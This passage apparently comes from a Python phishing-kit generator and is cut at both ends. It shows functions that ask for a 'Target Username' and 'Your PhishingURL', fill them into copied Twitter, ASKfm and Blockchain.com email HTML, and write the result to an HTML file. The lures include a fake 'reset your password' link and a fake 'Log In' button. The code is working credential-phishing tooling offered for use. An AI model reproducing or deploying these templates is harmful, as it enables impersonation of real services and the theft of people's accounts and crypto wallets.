id="m_7210276772504823937header" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0"><tbody><tr align="left;"><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px"><table class="m_7210276772504823937collapse" cellpadding="0" cellspacing="0" border="0" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td align="left;" class="m_7210276772504823937h2" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:24px;line-height:32px;font-weight:bold;color:#292f33;text-align:left;text-decoration:none"> We noticed a recent login for your account <a href="" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;color:#292f33;text-decoration:none" target="_blank">{}</a>. </td></tr><tr><td height="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellspacing="0" border="0" class="m_7210276772504823937collapse" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td width="30" style="width:30px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937margins"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937collapse" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td align="left" width="25%" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"><strong>Device</strong></td><td width="15" style="width:15px;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="left" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none">Chrome on Android</td></tr><tr><td align="left" width="25%" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"><strong>Location</strong></td><td width="15" style="width:15px;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="left" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none">Near {}, {}</td></tr></tbody></table> </td></tr></tbody></table> </td></tr><tr><td height="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> <strong>If this was you:</strong> </td></tr><tr><td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left" class="m_7210276772504823937body-text" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> Great! There's nothing else you need to do. </td></tr><tr><td height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left;" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> <strong>If this wasn’t you:</strong> </td></tr><tr><td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left;" class="m_7210276772504823937body-text" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> Your account may have been compromised and you should take a few steps to make sure your account is secure. To start, <a href="{}" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;border:none;text-decoration:none;font-weight:400;color:#1da1f2" target="_blank">reset your password now</a>. </td></tr><tr><td height="36" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937edu-module" style="padding:0;margin:0;line-height:1px;font-size:1px;background-color:#ffffff;border-radius:5px"><tbody><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td colspan="3" height="24" class="m_7210276772504823937edu-space" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td width="24" class="m_7210276772504823937edu-margins" style="padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937edu-module" bgcolor="#F5F8FA" style="padding:0;margin:0;line-height:1px;font-size:1px;background-color:#ffffff;border-radius:5px"><tbody><tr><td align="left" style="padding:0;margin:0;line-height:1px;font-size:1px"><table border="0" cellpadding="0" cellspacing="0" width="100%" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td class="m_7210276772504823937edu-header" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:22px;text-align:left;color:#8899a6"> <strong>How do I know an email is from <span class="il">Twitter</span>?</strong> </td></tr><tr><td colspan="3" height="12" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td class="m_7210276772504823937edu-text" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:19px;font-weight:400;text-align:left;color:#8899a6"> Links in this email will start with “<span class="m_7210276772504823937no-link"><a href="#m_7210276772504823937_" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;color:#8899a6;text-decoration:none">https://</a></span>” and contain “<span class="m_7210276772504823937no-link"><a href="{}" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;color:#8899a6;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://twitter.com/i/redirect?url%3Dhttps%253A%252F%252Ftwitter.com%252F%253Frefsrc%253Demail%26t%3D1%26cn%3DbG9naW5fbm90aWZpY2F0aW9u%26sig%3D5810b2be86b6d2764512337d9cf3ea4d02812789%26iid%3Dd245d496e25743259b05c4aeaf0b44cf%26uid%3D2356568077%26nid%3D244%2B1554&amp;source=gmail&amp;ust=1488768499007000&amp;usg=AFQjCNFX5GJTsk-lhQbDIpjXZSXB0zgDlQ"><span class="il">{}</span>{}</a></span>.” Your browser will also display a padlock icon to let you know a site is secure. </td></tr></tbody></table> </td></tr></tbody></table> </td><td width="24" class="m_7210276772504823937edu-margins" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td colspan="3" height="24" class="m_7210276772504823937edu-space" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937edu-module" style="padding:0;margin:0;line-height:1px;font-size:1px;background-color:#ffffff;border-radius:5px"><tbody><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table><table class="m_7210276772504823937collapse" id="m_7210276772504823937footer" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td height="36" style="height:36px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span class="m_7210276772504823937small-copy" style="font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none"> <a href="https://support.twitter.com/articles/76036" class="m_7210276772504823937small-copy" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:600;color:#1da1f2;text-align:left;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://support.twitter.com/articles/76036&amp;source=gmail&amp;ust=1488768499007000&amp;usg=AFQjCNHUCzbUjXfmNAT0B7wamPYK6mFWjQ">Help</a> &nbsp;|&nbsp; <a href="https://twitter.com/i/redirect?url=https%3A%2F%2Fsupport.twitter.com%2Farticles%2F204820-fake-twitter-emails&amp;t=1&amp;cn=bG9naW5fbm90aWZpY2F0aW9u&amp;sig=ee6d8d5439b23c101a3694be6e6989a2ffa94c79&amp;iid=d245d496e25743259b05c4aeaf0b44cf&amp;uid=2356568077&amp;nid=244+1558" class="m_7210276772504823937small-copy" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:600;color:#1da1f2;text-align:left;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://twitter.com/i/redirect?url%3Dhttps%253A%252F%252Fsupport.twitter.com%252Farticles%252F204820-fake-twitter-emails%26t%3D1%26cn%3DbG9naW5fbm90aWZpY2F0aW9u%26sig%3Dee6d8d5439b23c101a3694be6e6989a2ffa94c79%26iid%3Dd245d496e25743259b05c4aeaf0b44cf%26uid%3D2356568077%26nid%3D244%2B1558&amp;source=gmail&amp;ust=1488768499007000&amp;usg=AFQjCNHriReOKYKBFgrb1BXxDnBgMcj2aA">Email security tips</a> </span> </td></tr><tr><td height="12" style="height:12px;line-height:1px;font-size:1px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span class="m_7210276772504823937small-copy" style="font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none"> This email was meant for {}</span> </td></tr><tr><td height="6" style="height:6px;line-height:1px;font-size:1px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span class="m_7210276772504823937address"> <a href="#m_7210276772504823937_" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;color:#8899a6;font-size:12px;padding:0px;margin:0px;font-weight:normal;line-height:12px"><span class="il">Twitter</span>, Inc. 1355 Market Street, Suite 900 San Francisco, CA 94103</a> </span> </td></tr><tr><td height="72" style="height:72px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td></tr></tbody></table><div class="yj6qo"></div><div class="adL"></div></div>""".format(AccountName, City, Country, PhishUrl, PhishUrl, MustContain, Extension, TargetName))

	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(twitter)
	Html_file.close()
	print(alert + " HTML File Created")

def AskFM():
	username = input(start + " Enter Target Username: ")
	phishingurl = input(start + " Enter Your PhishingURL: ")
	
	ask = ("""
	<div style="background-color:#f2f3f7">

	<table style="padding:0;width:100%;font-family:Verdana,Tahoma,Arial,Helvetica,sans-serif;font-size:14px" cellspacing="0" cellpadding="0">
		<tbody>
		<tr>
			<td style="background-color:#fff;border-bottom:8px solid #f2f3f7;height:55px;padding:0px 10px 0px;color:#fff;font-weight:bold;text-align:center">
				<img alt="ASKfm" style="border:none;vertical-align:middle" src="https://ask.fm/images/welcomeLogo-160.png">
			</td>
		</tr>
		<tr>
			<td style="background-color:#fff;border:1px solid #fff;padding:20px">
				<b>We have received your request to recover your account information on ASKfm.</b>
				<p>
				  Your Username is: {}
				</p>
				<p>
				click the link to reset your password:
					<a target="_blank" style="color:#3081a3" href="{}">{}</a>
				</p>
			</td>
		</tr>
		<tr>
			<td style="padding-left:20px;padding-right:20px;padding-top:0px;padding-bottom:0px;background-color:#f2f3f7;text-align:center">
				<p style="font-size:11px;color:#898989">
				I sociala nätverk: <a target="_blank" style="color:#ff643c;text-decoration:none" href="http://ask.fm/askfm">ASKfm</a>
					| <a target="_blank" style="color:#ff643c;text-decoration:none" href="{}">Twitter</a>
					| <a target="_blank" style="color:#ff643c;text-decoration:none" href="{}">Facebook</a>
					| <a target="_blank" style="color:#ff643c;text-decoration:none" href="{}">Instagram</a>
					| <a target="_blank" style="color:#ff643c;text-decoration:none" href="{}">VK</a>
				</p>
			</td>
		</tr>
		</tbody>
	</table>

	</div>
	</div></div>""".format(username, phishingurl, phishingurl, phishingurl, phishingurl, phishingurl, phishingurl))

	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(ask)
	Html_file.close()
	print(alert + " HTML File Created")
	
def Blockchain():
	phishingurl = input(start + " Enter Your PhishingURL: ")
	
	sourcecode = ("""
	<div style="color: transparent; visibility: hidden; opacity: 0; font-size: 0px; border: 0; max-height: 1px; width: 1px; margin: 0px; padding: 0px; border-width: 0px!important; display: none!important; line-height: 0px!important;"><img src="http://go.sparkpostmail2.com/q/Q7tsiXTRYQG7SEDvizET-g~~/AAP1OAA~/RgRgcaotPVcDc3BjQgoAKi0lj17Xt8P6UhViaXprZW5AcHJvdG9ubWFpbC5jb21YBAAAAAA~" width="1" height="1" border="0" /></div>
	<p><span style="color: transparent; visibility: hidden; display: none; opacity: 0; height: 0; width: 0; font-size: 0;">Whether for filing taxes or simply for your own records, you can now download your transaction history as a CSV.</span><img style="border: 0; width: 1px; height: 1px; border-width: 0px!important; display: none!important; line-height: 0!important;" src="http://links.blockchain.com/e/eo?_t=b077a02c6d894ec28e56236cee81e43a&amp;_m=72a52e96a6a74b70850eec468ada1374&amp;_e=lPfbQA3SIQ7hISMt9H7G0NypCD_6FLhliEbdOmCO-NGLfXR96pBl4HW95MZyyhoFNTSOLnZ64-9Y7onhzSmdiYIf5ODjBxJxT_TJHbaJfmtbBTPuu72vhqYHjTOpp16nkYlWwSXv2acjsrpbF-WBySlSokSBpK4pqxCMPho__FA%3D" width="1" height="1" /></p>
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; padding: 12px; background-color: #ffffff;">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; background: #F4F6F7; background-color: #f4f6f7; margin: 0px auto; max-width: 600px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #F4F6F7; background-color: #f4f6f7; width: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center" bgcolor="#F4F6F7">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 12px 12px; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; background: #F4F6F7; background-color: #f4f6f7; margin: 0px auto; max-width: 576px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #F4F6F7; background-color: #f4f6f7; width: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center" bgcolor="#F4F6F7">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 0; padding-bottom: 20px; padding-top: 15px; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: middle; width: 100%;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: middle; padding: 0;" valign="middle">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0px; padding: 0; word-break: break-word;" align="center">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; mso-table-lspace: 0pt; mso-table-rspace: 0pt; border-collapse: collapse; border-spacing: 0px;" role="presentation" border="0" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 200px;" width="200"><a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; text-decoration: none;" href="{}" target="_blank" rel="noopener"><img style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; line-height: 100%; -ms-interpolation-mode: bicubic; border: 0; display: block; outline: none; text-decoration: none; height: auto; width: 100%; font-size: 13px;" src="https://www.blockchain.com/static/img/email/com-blue-logo@2x.png" alt="blockchain.com wallet logo" width="275" height="auto" /> </a></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; background: #ffffff; background-color: #ffffff; margin: 0px auto; border-radius: 12px; max-width: 576px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #ffffff; background-color: #ffffff; width: 100%; border-radius: 12px;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center" bgcolor="#ffffff">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 0; padding-bottom: 32px; padding-left: 40px; padding-right: 40px; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: top; width: 100%;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; padding: 0;" valign="top">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 34px; font-size: 0px; padding: 0; padding-top: 24px; padding-bottom: 20px; word-break: break-word;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 18px; line-height: 1; text-align: center; color: #000000;"><strong style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">Download Your Transaction History</strong></div>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0px; padding: 0; word-break: break-word;">&nbsp;</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 24px; font-weight: 500; font-size: 0px; padding: 0; padding-top: 28px; word-break: break-word;" align="left">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 16px; line-height: 1; text-align: left; color: #000000;">Hi there,</div>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 24px; font-weight: 500; font-size: 0px; padding: 0; padding-top: 20px; padding-bottom: 12px; word-break: break-word;" align="left">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 16px; line-height: 24px; text-align: left; color: #000000;">Whether for filing taxes or simply keeping your own records, you can now download your transaction history from Blockchain.com&rsquo;s Wallet or Exchange as a CSV. Simply log in and navigate to the Swap History page in the Wallet or the Order History page in the Exchange and select &lsquo;Download&rsquo; - we&rsquo;ll email you with a download link from there.</div>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0px; padding: 0; padding-top: 8px; padding-bottom: 4px; word-break: break-word;" align="center">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; mso-table-lspace: 0pt; mso-table-rspace: 0pt; border-collapse: separate; width: 200px; line-height: 100%;" role="presentation" border="0" width="200" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; border: none; border-radius: 4px; cursor: auto; height: 40px; mso-padding-alt: 0 40px; background: #096df2;" role="presentation" align="center" valign="middle" bgcolor="#096df2" height="40"><a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; display: inline-block; width: 120px; background: #096df2; color: #ffffff; font-family: Helvetica, Arial, sans-serif; font-size: 14px; font-weight: 600; line-height: 120%; margin: 0; text-decoration: none; text-transform: none; padding: 0 40px; mso-padding-alt: 0px; border-radius: 4px;" href="{}" target="_blank" rel="noopener">Log In</a></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 24px; font-weight: 500; font-size: 0px; padding: 0; padding-top: 16px; word-break: break-word;" align="left">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 16px; line-height: 1; text-align: left; color: #000000;">- Team Blockchain.com</div>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; background: #F4F6F7; background-color: #f4f6f7; margin: 0px auto; max-width: 600px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #F4F6F7; background-color: #f4f6f7; width: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center" bgcolor="#F4F6F7">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
